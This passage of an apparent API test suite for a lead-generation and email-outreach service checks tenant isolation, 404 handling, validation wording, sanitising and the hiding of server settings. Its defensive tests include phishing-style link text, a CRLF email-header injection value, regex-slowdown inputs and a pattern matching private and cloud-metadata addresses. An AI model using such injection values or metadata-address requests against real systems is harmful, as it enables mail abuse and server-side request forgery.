      expect((await req("GET", `/v1/leads/export.csv?tag=${tag}`, A.token)).text).not.toContain(marker);
      expect((await req("GET", `/v1/leads/${mine.id}`, A.token)).text).not.toContain(marker);
      expect((await req("GET", "/v1/leads/hot/list?limit=200", A.token)).text).not.toContain(marker);
      expect((await req("POST", "/v1/campaigns/generate", A.token, { leadId: mine.id, sender: { name: "A", company: "A", valueProp: "v" } })).text).not.toContain(marker);
    });

    it("a campaign pointing at another workspace's sender or lead does not read them", async () => {
      const marker = `foreign-sender-${u8()}`;
      const [acct] = await db.insert(S.emailAccounts).values({ orgId: B.orgId, provider: "system", fromName: marker, fromEmail: "b@example.com", signature: `${marker}-signature` }).returning();
      const [cp] = await db.insert(S.campaigns).values({ orgId: A.orgId, name: "X", emailAccountId: acct.id }).returning();
      await db.insert(S.sequenceSteps).values({ campaignId: cp.id, stepNo: 1, subjectTemplate: "Hi from {{sender_name}}", bodyTemplate: "Hello {{first_name}}\n{{signature}}", aiPersonalize: false });
      const mine = await lead(A.orgId);
      const prev = await req("POST", `/v1/campaigns/${cp.id}/preview`, A.token, { leadId: mine.id });
      expect(prev.status).toBe(200);
      expect(prev.text).not.toContain(marker);
      // a message row in A that points at B's lead
      const theirLead = await lead(B.orgId, { fullName: `${marker} Person`, title: `${marker} title` });
      await db.insert(S.messages).values({ orgId: A.orgId, campaignId: cp.id, leadId: theirLead.id, toEmail: "x@example.com", subject: "s", bodyText: "b", status: "sent" });
      const msgs = await req("GET", `/v1/campaigns/${cp.id}/messages`, A.token);
      expect(msgs.status).toBe(200);
      expect(msgs.body.messages).toHaveLength(1);
      expect(msgs.body.messages[0].lead).toBeNull();
      expect(msgs.text).not.toContain(marker);
    });

    it("pool routing ignores an ICP that belongs to another workspace", async () => {
      const marker = `foreign-icp-${u8()}`;
      const [icp] = await db.insert(S.icps).values({ orgId: B.orgId, name: marker, criteria: { titles: ["CEO"] } }).returning();
      const O = await signup("route");
      await db.insert(S.clients).values({ orgId: O.orgId, name: "Client", icpId: icp.id, status: "active" });
      await lead(O.orgId, { title: "CEO" });
      const r = await req("GET", "/v1/clients/routing?limit=100", O.token);
      expect(r.status).toBe(200);
      expect(r.text).not.toContain(marker);
      expect(r.body.unroutableClients?.[0]).toMatchObject({ reason: "no_icp" });
    });
  });

  // ── 14. Unknown ids are 404s ──
  describe("unknown and foreign ids answer 404, not an empty 200 (A10)", () => {
    it("on campaign contacts and messages, monitor results and visitor domains", async () => {
      const [cp] = await db.insert(S.campaigns).values({ orgId: B.orgId, name: "Theirs" }).returning();
      const [mon] = await db.insert(S.monitors).values({ orgId: B.orgId, type: "keyword", name: "m", target: "t" }).returning();
      const dom = `v-${u8()}.example.com`;
      await db.insert(S.visitorCompanies).values({ orgId: B.orgId, domain: dom, visits: 1, sessions: 1 });
      const cases: [string, string, unknown?][] = [
        ["GET", `/v1/campaigns/${cp.id}/contacts`],
        ["GET", `/v1/campaigns/${cp.id}/messages`],
        ["GET", `/v1/campaigns/${randomUUID()}/contacts`],
        ["GET", `/v1/campaigns/${randomUUID()}/messages`],
        ["GET", `/v1/signals/monitors/${mon.id}/results`],
        ["GET", `/v1/signals/monitors/${randomUUID()}/results`],
        ["GET", `/v1/visitors/${dom}/visits`],
        ["GET", `/v1/visitors/never-seen-${u8()}.example.com/visits`],
        ["PATCH", `/v1/visitors/${dom}`, { status: "ignored" }],
        ["PATCH", `/v1/visitors/never-seen-${u8()}.example.com`, { status: "ignored" }],
      ];
      for (const [m, p, b] of cases) {
        const r = await req(m, p, A.token, b);
        expect({ m, p, status: r.status, code: r.body?.error?.code }).toEqual({ m, p, status: 404, code: "not_found" });
      }
      expect((await db.select().from(S.visitorCompanies).where(S.and(S.eq(S.visitorCompanies.orgId, B.orgId), S.eq(S.visitorCompanies.domain, dom))))[0].status).toBe("new");
      // The owner still gets a 200 - including an empty one for a campaign with no contacts.
      const own = await req("GET", `/v1/campaigns/${cp.id}/contacts`, B.token);
      expect(own.status).toBe(200);
      expect(own.body.contacts).toEqual([]);
      expect((await req("GET", `/v1/signals/monitors/${mon.id}/results`, B.token)).status).toBe(200);
      expect((await req("GET", `/v1/visitors/${dom}/visits`, B.token)).status).toBe(200);
      expect((await req("PATCH", `/v1/visitors/${dom}`, B.token, { status: "reviewed" })).status).toBe(200);
    });
  });

  // ── 15. Hand-set fields ──
  describe("hand-set score and email status", () => {
    it("clamps a PATCHed score to 0-100 and holds emailStatus to the known values", async () => {
      const l = await lead(A.orgId);
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { score: -5000 })).body.score).toBe(0);
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { score: 1e39 })).body.score).toBe(100);
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { score: 72.6 })).body.score).toBe(73);
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { emailStatus: "E".repeat(100_000) })).status).toBe(400);
      expect((await req("PATCH", `/v1/leads/${l.id}`, A.token, { emailStatus: "verified!!" })).status).toBe(400);
    });

    it("a status typed in by hand is not shown to a client as a verified address", async () => {
      const O = await signup("report");
      const client = await req("POST", "/v1/clients", O.token, { name: `Rep ${u8()}` });
      const handSet = await lead(O.orgId, { clientId: client.body.id, clientAssignedAt: new Date(), fullName: "Hand Set" });
      // one a verifier really checked, and one a verifier checked that is then overridden by hand
      await lead(O.orgId, { clientId: client.body.id, clientAssignedAt: new Date(), fullName: "Really Checked", emailStatus: "valid", verifiedAt: new Date(), emailVerifiedBy: "smtp" });
      const overridden = await lead(O.orgId, { clientId: client.body.id, clientAssignedAt: new Date(), fullName: "Overridden", emailStatus: "invalid", verifiedAt: new Date(), emailVerifiedBy: "smtp" });
      for (const l of [handSet, overridden]) {
        const p = await req("PATCH", `/v1/leads/${l.id}`, O.token, { emailStatus: "valid" });
        expect(p.status).toBe(200);
        expect(p.body).toMatchObject({ emailStatus: "valid", verifiedAt: null, emailVerifiedBy: null });
      }
      const share = await req("POST", `/v1/clients/${client.body.id}/share`, O.token);
      const rep = await req("GET", `/v1/public/clients/report/${share.body.shareToken}`);
      expect(rep.status).toBe(200);
      const byName = Object.fromEntries(rep.body.leads.map((x: any) => [x.name, x.emailVerified]));
      expect(byName).toEqual({ "Hand Set": false, "Really Checked": true, Overridden: false });
      expect(rep.body.stats.verified).toBe(1);
    });
  });

  // ── final round: what a customer reads ──

  describe("validation messages are written for the person filling in the form", () => {
    it("zod's built-in wording is replaced; a message a schema wrote itself is kept", async () => {
      const { z } = await import("zod");
      const { describeIssues } = await import("./lib/validate.js");
      const say = (schema: any, value: unknown) => {
        const r = schema.safeParse(value);
        return r.success ? null : describeIssues(r.error);
      };
      const o = (shape: Record<string, any>) => z.object(shape);
      // Strings.
      expect(say(o({ title: z.string().max(300) }), { title: "t".repeat(301) })).toBe("Title is too long (300 characters at most)");
      expect(say(o({ password: z.string().min(8) }), { password: "abc" })).toBe("Password is too short (at least 8 characters)");
      expect(say(o({ name: z.string().min(1) }), { name: "" })).toBe("Name is required");
      expect(say(o({ name: z.string() }), {})).toBe("Name is required");
      expect(say(o({ name: z.string() }), { name: null })).toBe("Name is required");
      expect(say(o({ name: z.string() }), { name: 5 })).toBe("Name must be text");
      // Numbers.
      expect(say(o({ settings: o({ dailyLimit: z.number().int().min(1).max(2000) }) }), { settings: { dailyLimit: 0 } })).toBe("Daily limit must be 1 or more");
      expect(say(o({ settings: o({ dailyLimit: z.number().int().min(1).max(2000) }) }), { settings: { dailyLimit: 5000 } })).toBe("Daily limit must be 2,000 or less");
      expect(say(o({ minScore: z.coerce.number() }), { minScore: "abc" })).toBe("Min score must be a number");
      expect(say(o({ minScore: z.number() }), { minScore: "7" })).toBe("Min score must be a number");
      expect(say(o({ steps: z.number().int() }), { steps: 1.5 })).toBe("Steps must be a whole number");
      // Choices, addresses, ids.
      expect(say(o({ tone: z.enum(["friendly", "direct", "formal"]) }), { tone: "rude" })).toBe("Tone must be one of: friendly, direct, formal");
      expect(say(o({ fromEmail: z.string().email() }), { fromEmail: "nope" })).toBe("From email is not a valid email address");
      expect(say(o({ website: z.string().url() }), { website: "nope" })).toBe("Website is not a valid web address");
      expect(say(o({ listId: z.string().uuid() }), { listId: "abc" })).toBe("List ID is not a valid id");
      // Lists.
      expect(say(o({ leadIds: z.array(z.string()).min(1).max(2) }), { leadIds: [] })).toBe("Lead ids needs at least 1 item");
      expect(say(o({ leadIds: z.array(z.string()).min(1).max(2) }), { leadIds: ["a", "b", "c"] })).toBe("Lead ids has too many items (2 at most)");
      // Several at once, in order.
      expect(say(o({ name: z.string().min(1), tone: z.enum(["a", "b"]) }), { name: "", tone: "c" })).toBe("Name is required; Tone must be one of: a, b");
      // A message the schema wrote for people is kept, after the field's name.
      expect(say(o({ start: z.string().regex(/^\d\d:\d\d$/, "Use 24-hour HH:MM, e.g. 09:00") }), { start: "9am" })).toBe("Start: Use 24-hour HH:MM, e.g. 09:00");
      expect(say(o({ start: z.string().regex(/^\d\d:\d\d$/) }), { start: "9am" })).toBe("Start is not in the expected format");
      // Nothing of zod's own phrasing survives in any of them.
      const all = [say(o({ a: z.string().max(3) }), { a: "abcd" }), say(o({ a: z.number() }), { a: NaN }), say(o({ a: z.string() }), {}), say(o({ a: z.enum(["x"]) }), { a: "y" })].join(" | ");
      expect(all).not.toMatch(/String must|character\(s\)|Expected |received|Required|Invalid enum/);
    });

    it("the API answers in those words, and keeps zod's raw issues for code", async () => {
      const limit = await req("POST", "/v1/campaigns", A.token, { name: "x", settings: { dailyLimit: 0 } });
      expect(limit.status).toBe(400);
      expect(limit.body.error.code).toBe("validation_error");
      expect(limit.body.error.message).toBe("Daily limit must be 1 or more");
      // `issues` is untouched: the path and zod's own message, for programs.
      expect(limit.body.error.issues[0]).toMatchObject({ code: "too_small", path: ["settings", "dailyLimit"], message: "Number must be greater than or equal to 1" });

      const missing = await req("POST", "/v1/campaigns", A.token, {});
      expect(missing.body.error.message).toBe("Name is required");
      const nan = await req("GET", "/v1/leads?limit=abc", A.token);
      expect(nan.status).toBe(400);
      expect(nan.body.error.message).toBe("Limit must be a number");
      const sort = await req("GET", "/v1/leads?sort=sideways", A.token);
      expect(sort.body.error.message).toBe("Sort must be one of: score, created, updated, name");
      const email = await req("POST", "/v1/leads", A.token, { fullName: "X", email: "not-an-address" });
      expect(email.status).toBe(400);
      expect(email.body.error.message).toBe("Email is not a valid email address");
      const id = await req("POST", "/v1/campaigns", A.token, { name: "x", listId: "abc" });
      expect(id.body.error.message).toBe("List ID is not a valid id");
      for (const r of [limit, missing, nan, sort, email, id]) expect(r.body.error.message).not.toMatch(/String must|character\(s\)|Expected |received |: Required|Invalid /);
    });

    it("a skipped import row gives the same kind of reason", async () => {
      const t = u8();
      const r = await importCsv(A.token, `name,email,title\n${"N".repeat(400)},long-${t}@example.com,CEO\nFine ${t},fine-${t}@example.com,CEO\n`);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(1);
      expect(r.body.skippedRows).toHaveLength(1);
      expect(r.body.skippedRows[0].reason).toMatch(/^Full name is too long \(\d[\d,]* characters at most\)$/);
      expect(r.body.skippedRows[0].reason).not.toMatch(/String must|character\(s\)/);
    });
  });

  describe("tool results carry no internal diagnostics unless asked for", () => {
    it("verify-batch and linkedin-to-email: verifierAttempts / guessedName / nameSource only with ?debug=1", async () => {
      const emails = [`v1-${u8()}@example.com`, "not-an-address"];
      const plain = await req("POST", "/v1/tools/verify-batch", A.token, { emails });
      expect(plain.status).toBe(200);
      expect(plain.body.results).toHaveLength(2);
      for (const row of plain.body.results) {
        expect(Object.keys(row)).not.toEqual(expect.arrayContaining(["verifierAttempts"]));
        expect(row).not.toHaveProperty("raw");
        // The documented fields are all still there.
        expect(row).toMatchObject({ email: expect.any(String), status: expect.any(String), confidence: expect.any(Number) });
      }
      expect(plain.body.summary).toBeTruthy();
      const debug = await req("POST", "/v1/tools/verify-batch?debug=1", A.token, { emails });
      expect(debug.status).toBe(200);
      expect(debug.body.results.every((row: any) => Array.isArray(row.verifierAttempts))).toBe(true);

      // A profile that cannot be read: only the URL slug is known, which is a guess.
      const url = `https://www.linkedin.com/in/jane-doe-${u8()}`;
      const li = await req("POST", "/v1/tools/linkedin-to-email", A.token, { urls: [url] });
      expect(li.status).toBe(200);
      expect(li.body.results).toHaveLength(1);
      expect(li.body.results[0]).toMatchObject({ url, found: false });
      expect(li.body.results[0].reason).toBeTruthy();
      expect(li.text).not.toMatch(/guessedName|nameSource|verifierAttempts/);
      const liDebug = await req("POST", "/v1/tools/linkedin-to-email?debug=1", A.token, { urls: [url] });
      expect(liDebug.body.results[0]).toHaveProperty("guessedName");
    });
  });

  describe("a member cannot turn on what the client report shows by creating the client with it", () => {
    it("POST /v1/clients has the gate PATCH has", async () => {
      const O = await signup("client-create");
      const denied = await req("POST", "/v1/clients", O.memberToken, { name: `Shown ${u8()}`, reportShowTarget: true });
      expect(denied.status).toBe(403);
      expect(denied.body.error.code).toBe("forbidden_role");
      expect(await db.select().from(S.clients).where(S.eq(S.clients.orgId, O.orgId))).toHaveLength(0);
      expect((await auditOf(O.orgId, "client.report_settings_changed")).map((r: any) => r.result)).toEqual(["denied"]);
      // A member still creates clients - without the setting, or with it off.
      const plain = await req("POST", "/v1/clients", O.memberToken, { name: `Plain ${u8()}` });
      expect(plain.status).toBe(201);
      expect(plain.body.reportShowTarget).toBe(false);
      const off = await req("POST", "/v1/clients", O.memberToken, { name: `Off ${u8()}`, reportShowTarget: false });
      expect(off.status).toBe(201);
      expect(off.body.reportShowTarget).toBe(false);
      // And still cannot turn it on afterwards (the existing PATCH gate).
      expect((await req("PATCH", `/v1/clients/${plain.body.id}`, O.memberToken, { reportShowTarget: true })).status).toBe(403);
      // An owner can, at creation.
      const owner = await req("POST", "/v1/clients", O.token, { name: `Owner ${u8()}`, reportShowTarget: true });
      expect(owner.status).toBe(201);
      expect(owner.body.reportShowTarget).toBe(true);
    });
  });

  describe("safeHeaderText is bounded on hostile input", () => {
    it("a 100,000-character name is cleaned in milliseconds, with the same result on ordinary names", async () => {
      const { safeHeaderText } = await import("./lib/sanitize.js");
      const hostile: Record<string, string> = {
        "a. repeated": "a.".repeat(50_000),
        "a.b/ repeated": "a.b/".repeat(25_000),
        "long scheme": `${"a".repeat(100_000)}://x`,
        "www. repeated": "www.".repeat(25_000),
        "a- repeated": "a-".repeat(50_000),
        spaces: " ".repeat(100_000),
        "labels then a path": `${"ab.".repeat(30_000)}com/x`,
      };
      safeHeaderText("warm up https://x.example a.b/c");
      for (const [name, input] of Object.entries(hostile)) {
        const t = performance.now();
        const out = safeHeaderText(input);
        const ms = performance.now() - t;
        expect(ms, `${name} took ${ms.toFixed(0)} ms`).toBeLessThan(100);
        expect(out.length).toBeLessThanOrEqual(80);
      }
      // Unchanged behaviour where it matters.
      expect(safeHeaderText("Acme.io")).toBe("Acme.io");
      expect(safeHeaderText("ACTION REQUIRED - sign in at https://phish.example/x now")).toBe("ACTION REQUIRED - sign in at now");
      expect(safeHeaderText("see evil.example/pay today")).toBe("see today");
      expect(safeHeaderText("www.evil.example rocks")).toBe("rocks");
      expect(safeHeaderText("Acme\r\nBcc: x")).toBe("Acme Bcc: x");
      expect(safeHeaderText("sub.domain.evil.co.uk/path?x=1 after")).toBe("after");
      // More labels than the pattern takes at once: the link (the path) still goes.
      expect(safeHeaderText("a.b.c.d.e.f.g.h.i.j.k.evil.example/pay x")).not.toMatch(/evil|pay/);
      expect(safeHeaderText("", 80, "a workspace")).toBe("a workspace");
    });
  });

  describe("no customer-facing message names a server setting", () => {
    /** Everything a customer could read back, gathered with NO provider configured (see the top of this file). */
    const NAMES_A_SETTING = /_API_KEY|SMTP_|\.env\b|OUTBOUND_SENDING_ENABLED|ENCRYPTION_KEY/;
    const NO_SEARCH = "Lead search isn't available right now because no search source is connected on our side. This is not a result about your market - contact support.";

    it("lead search, saved searches, autopilots and the discovery agent say that search is not connected - in words, and never as 'no leads match'", async () => {
      const O = await signup("no-providers");
      const { handlers } = await import("./jobs.js");
      vi.spyOn(console, "warn").mockImplementation(() => {});
      const seen: string[] = [];
      const query = { titles: ["CTO"], industries: ["fintech"], limit: 5, findEmails: false };

      // A one-off search: the reason is on the search the customer is looking at.
      const started = await req("POST", "/v1/search", O.token, query);
      expect(started.status).toBe(202);
      expect(await S.runJobById(db, handlers, started.body.jobId)).toBe(true);
      const search = await req("GET", `/v1/search/${started.body.search.id}`, O.token);
      expect(search.body.search).toMatchObject({ status: "done", resultCount: 0, error: NO_SEARCH });
      seen.push(search.text);

      // A saved search with an alert: the same sentence in the job's note and in the email.
      mocks.sent.length = 0;
      const ss = await req("POST", "/v1/tools/saved-searches", O.token, { name: `CTOs ${u8()}`, query, alert: true });
      expect(ss.status).toBe(201);
      const ssRun = await req("POST", `/v1/tools/saved-searches/${ss.body.id}/run`, O.token, {});
      expect(await S.runJobById(db, handlers, ssRun.body.jobId)).toBe(true);
      const ssJob = await req("GET", `/v1/search/jobs/${ssRun.body.jobId}`, O.token);
      expect(ssJob.body.result.note).toBe(NO_SEARCH);
      seen.push(ssJob.text);
      const alert = mocks.sent.find((m) => /Could not check/.test(m.subject));
      expect(alert?.text).toContain(NO_SEARCH);
      seen.push(JSON.stringify(alert));

      // An autopilot: the note the Autopilot page shows under the run.
      const ap = await req("POST", "/v1/tools/autopilots", O.token, { name: `Daily ${u8()}`, query });
      expect(ap.status).toBe(201);
      const apRun = await req("POST", `/v1/tools/autopilots/${ap.body.id}/run`, O.token, {});
      expect(await S.runJobById(db, handlers, apRun.body.jobId)).toBe(true);
      const aps = await req("GET", "/v1/tools/autopilots", O.token);
      expect(aps.body.autopilots[0].stats.lastNote).toBe(NO_SEARCH);
      seen.push(aps.text);

      // The discovery agent.
      const { runDiscoveryAgent } = await import("./services/agents/discovery.js");
      const run = await runDiscoveryAgent(O.orgId, "CTOs at fintech companies in Berlin");
      expect(run).toMatchObject({ status: "blocked", note: NO_SEARCH });
      seen.push(JSON.stringify(run));

      for (const text of seen) expect(text).not.toMatch(NAMES_A_SETTING);
    }, 60_000);

    it("AI that is not switched on, an invite email that could not be sent, and a paused platform: all in the customer's words", async () => {
      const O = await signup("no-ai");
      vi.spyOn(console, "warn").mockImplementation(() => {});
      const said: Record<string, string> = {};

      const [prompt] = await db.insert(S.visibilityPrompts).values({ orgId: O.orgId, text: "What is the best CRM for a small agency?" }).returning();
      const vis = await req("POST", `/v1/visibility/prompts/${prompt.id}/run`, O.token, {});
      expect(vis.status).toBe(503);
      expect(vis.body.error.code).toBe("ai_not_configured");
      expect(vis.body.error.message).toBe("AI visibility can't be sampled: AI drafting isn't switched on for this workspace yet. Contact support to enable it.");
      said.visibility = vis.text;

      const l = await lead(O.orgId, { firstName: "Asha", lastName: "Rao" });
      const draft = await req("POST", "/v1/campaigns/generate", O.token, { leadId: l.id, sender: { name: "Me", company: "Us", valueProp: "We help." } });
      expect(draft.status).toBe(200);
      expect(draft.body.note).toBe("AI drafting isn't switched on for this workspace yet, so this is a template, not a personalised draft. Contact support to enable it.");
      said.draft = draft.text;

      const icp = await req("POST", "/v1/icps", O.token, { name: `ICP ${u8()}` });
      const chat = await req("POST", `/v1/icps/${icp.body.id ?? icp.body.icp?.id}/chat`, O.token, { message: "tighten this" });
      said.icpChat = chat.text;

      // The platform's mailer has nothing configured: what the mailer itself reports...
      const mailer = await vi.importActual<typeof import("./lib/mailer.js")>("./lib/mailer.js");
      const env = (await import("./env.js")).env as { nodeEnv: string };
      const was = env.nodeEnv;
      env.nodeEnv = "production";
      let direct: Awaited<ReturnType<typeof mailer.sendMail>>;
      try {
        direct = await mailer.sendMail(null, { from: "Scout <no-reply@platform.test>", to: "x@example.net", subject: "s", text: "t" });
      } finally {
        env.nodeEnv = was;
      }
      expect(direct).toMatchObject({ ok: false, error: "Email sending is not set up on our side" });
      said.mailer = JSON.stringify(direct);
      // ...what a campaign send shows for it...
      const { sendFailureCategory } = await import("./services/campaigns.js");
      said.sendCategory = sendFailureCategory(direct);
      expect(said.sendCategory).toBe("Email sending is not set up on our side yet - contact support");
      // ...and what the person inviting a teammate is told, with the link to share by hand.
      const { sendMail } = await import("./lib/mailer.js");
      vi.mocked(sendMail).mockResolvedValueOnce({ ok: false, provider: "none", error: "No email provider configured (set RESEND_API_KEY or SMTP_*)" });
      const inv = await req("POST", "/v1/tools/team/invite", O.token, { email: `mate-${u8()}@example.net` });
      expect(inv.status).toBe(201);
      expect(inv.body).toMatchObject({ emailed: false, emailError: "The email could not be sent from our side - copy the link below and share it yourself." });
      expect(inv.body.link).toMatch(/\/join\?token=/);
      said.invite = inv.text;
      // A provider's own error text is not passed on either.
      vi.mocked(sendMail).mockResolvedValueOnce({ ok: false, provider: "resend", error: "API key re_PLATFORMKEY0123456789abcd is invalid" });
      const resend = await req("POST", `/v1/tools/team/invites/${inv.body.id}/resend`, O.token);
      expect(resend.body.emailError).toBe("The email could not be sent from our side - copy the link below and share it yourself.");
      said.resend = resend.text;

      // Sending paused by the operator: the campaign says who paused it, not which switch.
      const [acct] = await db.insert(S.emailAccounts).values({ orgId: O.orgId, provider: "system", fromName: "Asha", fromEmail: `asha-${u8()}@tenantco.example` }).returning();
      const cp = await req("POST", "/v1/campaigns", O.token, { name: "Paused", emailAccountId: acct.id, steps: [{ bodyTemplate: "Hello {{first_name}}", subjectTemplate: "Hi" }] });
      expect(cp.status).toBe(201);
      process.env.OUTBOUND_SENDING_ENABLED = "false";
      let start;
      try {
        start = await req("POST", `/v1/campaigns/${cp.body.id}/start`, O.token, {});
      } finally {
        delete process.env.OUTBOUND_SENDING_ENABLED;
      }
      expect(start.status).toBe(200);
      expect(start.body.tick.reason).toBe("sending is paused platform-wide by the operator");
      said.start = start.text;

      for (const [where, text] of Object.entries(said)) expect(text, where).not.toMatch(NAMES_A_SETTING);
    });

    it("counts read as a person would say them", async () => {
      const { plural, blockedByProvidersNote, listProviderFailures } = await import("./services/notes.js");
      expect([plural(0, "lead"), plural(1, "lead"), plural(2, "lead"), plural(1, "address", "addresses"), plural(3, "address", "addresses")]).toEqual(["0 leads", "1 lead", "2 leads", "1 address", "3 addresses"]);
      const refused = { provider: "apollo", message: "HTTP 402 (out of credits)" };
      const notConnected = { provider: "web_search", message: NO_SEARCH };
      expect(blockedByProvidersNote([refused], "This is not the same as nobody matching.")).toBe("No leads were returned, and the data source we tried could not answer: apollo - HTTP 402 (out of credits). This is not the same as nobody matching.");
      expect(blockedByProvidersNote([refused, notConnected], "This is not the same as nobody matching.")).toBe(
        "No leads were returned, and 2 data sources could not answer: apollo - HTTP 402 (out of credits); web search - no search source is connected on our side. This is not the same as nobody matching.",
      );
      expect(blockedByProvidersNote([notConnected], "This is not the same as nobody matching.")).toBe(NO_SEARCH);
      expect(listProviderFailures([refused])).toBe("apollo - HTTP 402 (out of credits)");
      // The seat-limit refusal, with one member and one pending invite.
      const O = await signup("plural-seats");
      await db.update(S.organizations).set({ planLimits: { ...S.limitsFor("scale"), seats: 2 } }).where(S.eq(S.organizations.id, O.orgId));
      await db.delete(S.users).where(S.eq(S.users.id, O.memberId));
      expect((await req("POST", "/v1/tools/team/invite", O.token, { email: `one-${u8()}@example.net` })).status).toBe(201);
      const full = await req("POST", "/v1/tools/team/invite", O.token, { email: `two-${u8()}@example.net` });
      expect(full.status).toBe(400);
      expect(full.body.error.message).toMatch(/\(2: 1 member and 1 pending invite\)/);
      expect(full.body.error.message).not.toMatch(/\(s\)/);
    });
  });

  it("made no request that left the machine", () => {
    // Every outbound attempt in this file was refused by the stub; none may have been to a
    // private or metadata address (that would be a request the app should never have built).
    expect(egress.filter((u) => /169\.254\.|127\.0\.0\.1|localhost|\.internal|\.local\b|10\.0\.0\./.test(u))).toEqual([]);
  });
});
